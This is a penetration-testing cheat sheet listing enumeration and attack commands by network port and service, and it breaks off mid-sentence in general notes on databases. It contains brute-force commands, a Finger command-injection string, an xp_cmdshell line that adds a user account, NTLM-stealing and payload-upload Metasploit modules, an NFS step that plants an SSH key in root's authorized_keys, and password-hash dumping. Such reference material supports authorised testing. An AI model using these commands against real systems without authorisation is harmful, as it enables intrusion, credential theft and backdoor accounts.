<h1 align="center">Pentesting Methodology</h1>

-   **Ftp Port 21 open**

    -   The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client and server on a computer network

    -   Also FTP is a service that is commonly used in Web Servers from Webmasters for accessing the files remotely.So it is almost impossible not to find this service in one of our clients systems during an engagement.

    -   Try login with anonymous credentials

        -   Nc \[ip\] 21

        -   Anonumous : anonymous

        -   Anonymous :

        -   Ftp :ftp

    -   You can connect to the Ftp server by a browser

        -    [ftp://anonymous:anonymous\@10.10.10.98]

    -   Ftp bounce attack

    -   Nmap

        -   nmap \--script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 \[ip\]

    -   Metasploit

        -   auxiliary/scanner/ftp/ftp\_version

        -   auxiliary/scanner/ftp/anonymous -\> anonymous login

        -   auxiliary/scanner/ftp/ftp\_login  -\> brute force login

        -   auxiliary/scanner/ftp/konica\_ftp\_traversal

-   **Ssh port 22 open**

    -   user enumeration (some versions of openssh can leads to info leakage)

    -   **Nmap (enum)**

        -   nmap -p 22 -n -v -sV -Pn \--script ssh-auth-methods \--script-args ssh.user=root \[ip\]

        -   nmap -p 22 -n -v -sV -Pn \--script ssh-hostkey 192.168.1.10

        -   nmap -p 22 -n -v -sV -Pn \--script ssh-brute \--script-args userdb=user\_list.txt,passdb=password\_list.txt 192.168.1.10

    -   **Metasploit**

        -   auxiliary/scanner/ssh/fortinet\_backdoor

        -   auxiliary/scanner/ssh/juniper\_backdoor

        -   auxiliary/scanner/ssh/ssh\_enumusers

        -   auxiliary/scanner/ssh/ssh\_identify\_pubkeys

        -   auxiliary/scanner/ssh/ssh\_login

        -   auxiliary/scanner/ssh/ssh\_login\_pubkey

        -   auxiliary/scanner/ssh/ssh\_version

-   **Dns port 53 open**

-   **TFTP port 69 open**

-   **Finger port 79**

    -   Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user\'s plan and project files

    -   **Metasploit**

        -   use auxiliary/scanner/finger/finger\_users

    -   **Enumeration**

        -   finger @\<Victim\> \#List users

        -   finger admin@\<Victim\> \#Get info of user

        -   finger user@\<Victim\> \#Get info of user

    -   **Command execution**

        -   finger \"\|/bin/id\@example.com\"

        -   finger \"\|/bin/ls -a /\@example.com\"


-   **Kerberos port 88 open**

-   **Pop3 port 110 , 995 open**

    -   type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. **POP** is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email

    -   **Nmap enum**

        -   nmap \--scripts \"pop3-capabilities or pop3-ntlm-info\" -sV -port \<PORT\> \<IP\>

    -   **Pop commands**

        -   USER uid Log in as \"uid\"

        -   PASS password Substitue \"password\" for your actual password

        -   STAT List number of messages, total mailbox size

        -   LIST List messages and sizes

        -   RETR n Show message n

        -   DELE n Mark message n for deletion

        -   RSET Undo any changes

        -   QUIT Logout (expunges messages if no RSET)

        -   TOP msg n Show first n lines of message number msg

        -   CAPA Get capabilities

-   **Ntp port 123/udp open**

-   **Rpc port 135 , 593 open (msrpc)**

    -   Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135 (msrpc) or , via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593

    -   **Services Running**

        -   rpcinfo --p \$ip

        -   rpcbind -p rpcinfo --p x.x.x.x

    -   **Session with a valid user**

        -   rpcclient \--user=\"Username\" \[ip\]

        -   rpcclient \--user=\"Username\" --command=enumprivs \[ip\]

    -   **Null Session/User Rpc login**

        -   rpcclient -U \"\" \[ip\]

            -   rpcclient\> srvinfo

            -   rpcclient\> enumdomusers -\> get username as well as their rid

            -   rpcclient\> getdompwinfo

            -   rpcclient\> enumprivs

            -   rpcclient\> enumalsgroups domain

            -   rpcclient\> lookupnames administrators

            -   rpcclient\> querydominfo

            -   rpcclient\> queryuser user

    -   **Nmap**

        -   nmap -n -v -sV -Pn -p 135 \--script=msrpc-enum \[ip\]

    -   **Metasploit**

        -   use exploit/windows/dcerpc/ms03\_026\_dcom

-   **Imap port 143 , 993 open**

    -   IMAP allows you to access your email messages wherever you are; much of the time, it is accessed via the Internet. Basically, email messages are stored on servers. Whenever you check your inbox, your email client contacts the server to connect you with your messages. When you read an email message using IMAP, you aren\'t actually downloading or storing it on your computer; instead, you are reading it off of the server. As a result, it\'s possible to check your email from several different devices

    -   **Nmap**

        -   Nmap \--script = imap-ntlm-info.nse \[ip\] --p 143

    -   **Commands**

        -   **Login**

            -   A1 LOGIN username password

            -   Values can be quoted to enclose spaces and special characters. A \" must then be escape with a \\

            -   A1 LOGIN \"username\" \"password\"

        -   **List Folders/Mailboxes**

            -   A1 LIST \"\" \*

            -   A1 LIST INBOX \*

            -   A1 LIST \"Archive\" \*

        -   **Create new Folder/Mailbox**

            -   A1 CREATE INBOX.Archive.2012

            -   A1 CREATE \"To Read\"

        -   **Delete Folder/Mailbox**

            -   A1 DELETE INBOX.Archive.2012

            -   A1 DELETE \"To Read\"

        -   **Rename Folder/Mailbox**

            -   A1 RENAME \"INBOX.One\" \"INBOX.Two\"

        -   **List Subscribed Mailboxes**

            -   A1 LSUB \"\" \*

        -   **Status of Mailbox (There are more flags than the ones listed)**

            -   A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

        -   **Select a mailbox**

            -   A1 SELECT INBOX

        -   **List messages**

            -   A1 FETCH 1:\* (FLAGS)

            -   A1 UID FETCH 1:\* (FLAGS)

        -   **Retrieve Message Content**

            -   A1 FETCH 2 body\[text\]

            -   A1 FETCH 2 all

            -   A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK\[\])

        -   **Close Mailbox**

            -   A1 CLOSE

        -   **Logout**

            -   A1 LOGOUT

-   **Smb (Samba) and Netbios port 135 , 137 , 138 ,139 , 445 open**

    -   **SMB** : Server Message Block, the modern dialect of which was known as Common Internet File System, operates as an application-layer network protocol for file sharing that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request

    -   **SMB Versions**

        -   CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.

        -   SMB 1.0 / SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.

        -   SMB 2.0 / SMB2: This version used in Windows Vista and Windows Server 2008.

        -   SMB 2.1 / SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.

        -   SMB 3.0 / SMB3: This version used in Windows 8 and Windows Server 2012.

        -   SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.

        -   SMB 3.1: This version used in Windows Server 2016 and Windows 10.

    -   **NetBIOS provides three distinct services:**

        -   Name service (NetBIOS-NS) for name registration and resolution via port 137.

        -   Datagram distribution service (NetBIOS-DGM) for connectionless comm. via port 138.

        -   Session service (NetBIOS-SSN) for connection-oriented communication via port 139. 

    -   **Port 135:** it is used for Microsoft **R**emote **P**rocedure **C**all between client and server to listen to the query of the client. Basically, it is used for communication between client- client and server -client for sending messages

    -   **Port 137: **the name service operates on UDP port 137. The name service primitives offered by NetBIOS are

        -   Add name -- registers a NetBIOS name.

        -   Add group name -- registers a NetBIOS "group" name.

        -   Delete name -- un-registers a NetBIOS name or group name.

        -   Find name -- looks up a NetBIOS name on the network.

    -   **Port 138**: Datagram mode is connectionless; the application is responsible for error detection and recovery. In NBT, the datagram service runs on UDP port 138. The datagram service primitives offered by NetBIOS are

        -   Send Datagram -- send a datagram to a remote NetBIOS name.

        -   Send Broadcast Datagram -- send a datagram to all NetBIOS names on the network.

        -   Receive Datagram -- wait for a packet to arrive from a Send Datagram operation.

        -   Receive Broadcast Datagram -- wait for a packet to arrive from a Send Broadcast Datagram operation.

    -   **Port 139**: Session mode lets two computers establish a connection, allows messages to span multiple packets, and provides error detection and recovery. In NBT, the session service runs on TCP port 139.The session service primitives offered by NetBIOS are :

        -   Call -- opens a session to a remote NetBIOS name.

        -   Listen -- listen for attempts to open a session to a NetBIOS name.

        -   Hang Up -- close a session.

        -   Send -- sends a packet to the computer on the other end of a session.

        -   Send No Ack -- like Send, but doesn't require an acknowledgment.

        -   Receive -- wait for a packet to arrive from a Send on the other end of a session.

    -   **Port 445:** It is used for SMB protocol (server message block) for sharing file between different operating system i.e. windows-windows, Unix-Unix and Unix-windows.

-   **Rexec port 512 open**

    -   It is a service that allows you to execute a command inside a host if you know valid credentials (username and password)

-   **Rlogin port 513 open**

    -   One of the services that you can discover in Unix environments is the rlogin.This service runs on port 513 and it allows users to login to the host remotely.This service was mostly used in the old days for remote administration but now because of security issues this service has been replaced by the slogin and the ssh.However if you find a system that is not properly configured and is using this service then you should try to exploit it

    -   **Install rsh client**

        -   The rsh-client is a remote login utility that it will allow users to connect to remote machines

        -   Apt install rsh-client

    -   **Login**

        -   rlogin --l \[user\] \[ip\]

        -   rlogin --l root \[ip\]

        -   The reason that we were able to connect remotely without any authentication is because that the rlogin as a service is insecure by design and it can potentially allow anyone to login without providing a password

        -   

-   **Rsh port 554 open**

    -   Rsh use .rhosts files and /etc/hosts.equiv for authentication. These methods relied on IP addresses and DNS (Domain Name System) for authentication. However, spoofing IP addresses is fairly easy, especially if the attacker is on the local network. Furthermore, the .rhosts files were stored in users\' home directories, which were typically stored on NFS (Network File System) volumes

    -   **Login**

        -   rsh \[IP\] \[Command\]

        -   rsh \[IP\] -l domain\\user \[Command\]

        -   rsh domain/user@\[IP\] \[Command\]

        -   rsh domain\\\\user@\[IP\] \[Command\]

-   **Mssql port 1433 open**

    -   **Nmap**

        -   nmap -n -v -sV -Pn -p 1433 \--script ms-sql-brute \--script-args userdb=users.txt,passdb=passwords.txt \[ip\]

        -   nmap -n -v -sV -Pn -p 1433 \--script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password \[ip\]

        -   nmap -n -v -sV -Pn -p 1433 \--script ms-sql-xp-cmdshell \--script-args mssql.username=SQL\_USER,mssql.password=SQL\_PASS,ms-sql-xp-cmdshell.cmd=\"net user lifeoverpentest password /add\" 192.168.1.10

        -   sqsh -S \[ip\] -U sa

    -   **Metasploit**

        -   **Bruteforce login**

        -   Msf\> use auxiliary/scanner/mssql/mssql\_login

        -   **Steal NTLM**

        -   msf\> use auxiliary/admin/mssql/mssql\_ntlm\_stealer \#Steal NTLM hash, before executing run Responder

        -   **Info gathering**

        -   msf \> use auxiliary/scanner/mssql/mssql\_ping

        -   msf\> use auxiliary/admin/mssql/mssql\_enum \#Security checks

        -   msf\> use auxiliary/admin/mssql/mssql\_enum\_domain\_accounts

        -   msf\> use auxiliary/admin/mssql/mssql\_enum\_sql\_logins

        -   msf\> use auxiliary/admin/mssql/mssql\_findandsampledata

        -   msf\> use auxiliary/scanner/mssql/mssql\_hashdump

        -   msf\> use auxiliary/scanner/mssql/mssql\_schemadump

        -   **Search for insteresting data**

        -   msf\> use auxiliary/admin/mssql/mssql\_findandsampledata

        -   msf\> use auxiliary/admin/mssql/mssql\_idf

        -   **Privesc**

        -   msf\> use exploit/windows/mssql/mssql\_linkcrawler

        -   msf\> use admin/mssql/mssql\_escalate\_execute\_as \#If the user has IMPERSONATION privilege, this will try to escalate

        -   msf\> use admin/mssql/mssql\_escalate\_dbowner \#Escalate from db\_owner to sysadmin

        -   **Code execution**

        -   msf\> use admin/mssql/mssql\_exec \#Execute commands

        -   msf\> use exploit/windows/mssql/mssql\_payload \#Uploads and execute a payload

        -   **Add new admin user from meterpreter session**

        -   msf\> use windows/manage/mssql\_local\_auth\_bypass

-   **Oracle db port 1521 open**

    -   **Nmap**

        -   nmap -p 1521 -A 192.168.15.205

        -   nmap -n -v -sV -Pn -p 1521 \--script=oracle-enum-users \--script-args sid=ORCL,userdb=users.txt 192.168.1.10

        -   nmap -n -v -sV -Pn -p 1521 \--script=oracle-sid-brute 192.168.1.10

    -   **oscanner**

        -   root\@kali:\~\# oscanner -s 192.168.1.15 -P 1040

    -   **sidguess**

        -   root\@kali:\~\# sidguess -i 192.168.1.205 -d /usr/share/wordlists/metasploit/unix\_users.txt

    -   **Tnscmd10g**

        -   tnscmd10g version -h 192.168.1.10

        -   tnscmd10g status -h 192.168.1.10

    -   **Metasploit**

        -   auxiliary/scanner/oracle/emc\_sid

        -   auxiliary/scanner/oracle/oracle\_login 

        -   auxiliary/scanner/oracle/sid\_brute

        -   auxiliary/scanner/oracle/sid\_enum

        -   auxiliary/scanner/oracle/tnslsnr\_version

        -   auxiliary/scanner/oracle/tnspoison\_checker

-   **Nfs port 2049 open**

    -   NFS stands for Network File System and it is a service that can be found in Unix systems. The purpose of NFS is to allow users to access shared directories in a network

    -   To know which folder has the server available to mount you an ask it using:

        -   showmount -e INSERTIPADDRESS (/ \* = root directory)

    -   If you found any shared directory you can mount it by

        -   mount -t nfs \[-o vers=2\] \[ip\]:\[remote\_folder\] \[local\_folder\] -o nolock

        -   Example :

            -   mkdir /mnt/new\_back

            -   mount -t nfs \[-o vers=2\] 10.12.0.150:/backup /mnt/new\_back -o nolock

    -   **Add ssh keys**

        -   ssh-keygen

        -   mkdir /mnt/share/

        -   mount -t nfs 192.168.0.10:/secret /mnt/share/

        -   cat \~/.ssh/id\_rsa.pub \>\> /mnt/share/root/.ssh/authorized\_keys

        -   umount /mnt/share

        -   ssh <root@192.168.0.10>

    -   **Metasploit**

        -   auxiliary/scanner/nfs/nfsmount

-   **Ldap port 389, 636, 3268, 3269 Open**

    -    active directory : is a centralized database  used to store username and passwords of users i network instead of saving each user in a single pc in sam file (sam file in windows = /etc/shaddow in linux ) so he can login from any pc registered in network domain database of ad is stored in NTDS/ntds.dit


-   **Mysql port 3306 open**

    -   **local**

        -   mysql -u root -\> Connect to root without password

        -   mysql -u root -p -\> A password will be asked (check someone)

    -   **remote**

        -   mysql -h \<Hostname\> -u root

        -   mysql -h \<Hostname\> -u root\@localhost

    -   **Enumeration**

        -   **Metasploit**

            -   msf\> use auxiliary/scanner/mysql/mysql\_version

            -   msf\> use uxiliary/scanner/mysql/mysql\_authbypass\_hashdump

            -   msf\> use auxiliary/scanner/mysql/mysql\_hashdump -\> Creds

            -   msf\> use auxiliary/admin/mysql/mysql\_enum -\> Creds

            -   msf\> use auxiliary/scanner/mysql/mysql\_schemadump -\> Creds

            -   msf\> use exploit/windows/mysql/mysql\_start\_up

                -   Execute commands Windows, Creds

        -   **Nmap**

            -   nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 \[ip\] -p 3306

        -   **MySQL important commands**

            -   show databases;

            -   use \[database name\]

            -   show tables;

            -   select \* from \[table\_name\]

            -   mysqldump -u root -p Password123! \--all-databases \> db\_backup.sql    -\> dump all databases

-   **Rdp port 3389 open**

    -   **Connecting with known credentials**

        -   rdesktop -u \[username\] \[ip\]

        -   rdesktop -d \[domain\] -u \[username\] -p \[password\] \[ip\]

        -   xfreerdp /u:\[domain\\\]\<username\> /p:\[password\] /v: \[ip\]

        -   xfreerdp /u:\[domain\\\]\<username\> /pth:\[hash\] /v: \[ip\]

    -   **Scan with nmap**

        -   nmap \--script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 \[ip\]

    -   **Bruteforce login**

        -   ncrack -vv \--user administrator -P passwords.txt [rdp://192.168.1.10,CL]=1

    -   **Metasploit**

        -   auxiliary/scanner/rdp/ms12\_020\_check

        -   auxiliary/scanner/rdp/rdp\_scanner

-   **Postgresql port 5432 , 5433 open**

    -   PostgreSQL is a database that comes with MacOS X Lion as a default standard database.Also according to wikipedia the majority of Linux distributions have the PostgreSQL in the supplied packages.

    -   Metasploit

        -   Bruteforce login

            -   Use auxiliary/scanner/postgres/postgres\_login

    -   Login

        -   Now that we have a valid username and password we can use that to connect to the database by using a psql client.The first query that we want to execute is the ***select usename, passwd from pg\_shadow; ***because it will return to us the password hashes of the database from the **pg\_shadow** table.

-   **Couchdb port 5894 open**

    -   CouchDB is a document-oriented database and within each document fields are stored as key-value maps. Fields can be either a simple key/value pair, list, or map. Each document that is stored in the database is given a document-level unique identifier (\_id) as well as a revision (\_rev) number for each change that is made and saved to the database.

    -   **Automatic enum**

        -   nmap -sV \--script couchdb-databases,couchdb-stats -p \<PORT\> \<IP\>

        -   msf\> use auxiliary/scanner/couchdb/couchdb\_enum

    -   **List databases**

        -   curl -X GET <http://IP:5984/_all_dbs>

        -   curl -X GET <http://user:password@IP:5984/_all_dbs>

    -   **List documents**

        -   curl -X GET [http://IP:5984/{dbname}/\_all\_docs]

    -   **Read document value**

        -   curl -X GET http://IP:5984/{dbname}/{id}

-   **WinRm port 5985, 5986 open**

-   **Vnc port 5900 , 5901 , 6800 , 5801 open**

    -   Often in infrastructure penetration tests,you might come across with the VNC service.The main use of this service is because systems administrators want to control remotely other systems or for technical support issues.So when a penetration tester discovers a VNC server running on port 5900 then it is a good practice to check if he could gain access to the system from that service by testing it for weak passwords

    -   Metasploit

        -   Use auxiliary/scanner/vnc/vnc\_login

-   **Mongodb port 27017 , 27018 open**

    -   MongoDB is a document-oriented, disk-based database optimized for operational simplicity, schema-free design and very large data volumes. 

        -   **Login to mongo**

            -   mongo \<HOST\>

            -   mongo \<HOST\>:\<PORT\>

            -   mongo \<HOST\>:\<PORT\>/\<DB\>

            -   mongo \<database\> -u \<username\> -p \'\<password\>\'

        -   **Nmap**

            -   nmap -sV \--script \"mongo\* and default\" -p 27017 \<IP\>

            -   nmap -n -sV \--script mongodb-brute -p 27017 \<ip\>

        -   **Mongo commands**

            -   show dbs

            -   use \<db\>

            -   show collections

            -   db.\<collection\>.find() \#Dump the collection

            -   db.\<collection\>.count() \#Number of records of the collection

            -   db.current.find({\"username\":\"admin\"}) \#Find in current db the username admin

-   **Redis port 6379 open**

    -   Redis and is a NoSql type database in-memory data structure store, used as a database, cache and message broker


-   **Irc port 194,6667,6660-7000 open**


-   **General Notes :**

    -   **Databases**

        -   **DBMS :**

            -   A database collects and organizes data, while access to that data is typically via a "database management system" (DBMS)  which is a software that  manages how the data is organized within the database

            -   **DBMS types :**

                -   Hierarchical databases

                -   Network databases

                -   Relational databases

                -   Object-oriented databases

                -   Graph databases

                -   ER model databases

                -   Document databases

                -   NoSQL databases

        -   **RDMS** :

            -   An RDBMS is a DBMS designed specifically for relational databases. Therefore, RDBMS are a subset of DBMS. A relational database refers to a [database] that stores data in a structured format, using [rows] and [columns]. This makes it easy to locate and access specific values within the database. It is \"relational\" because the values within each [table] are related to each other. Tables may also be related to other tables. The relational structure makes it possible to run [queries] across multiple tables at once. also it  allows you to create,read , update, delete and administer a relational database these operations is known as CRUD

            -   **Examples** :

                -   Mysql

                -   sqllite

                -   oracle databes

                -   MSSQL

                -   Postgesql

        -   **Nosql Databases**

            -   NoSQL is an approach to databases that represents a shift away from traditional relational database management systems (RDBMS). To define NoSQL, it is helpful to start by describing SQL, which is a query language used by RDBMS. Relational databases rely on tables, columns, rows, or schemas to organize and retrieve data. In contrast, NoSQL databases do not r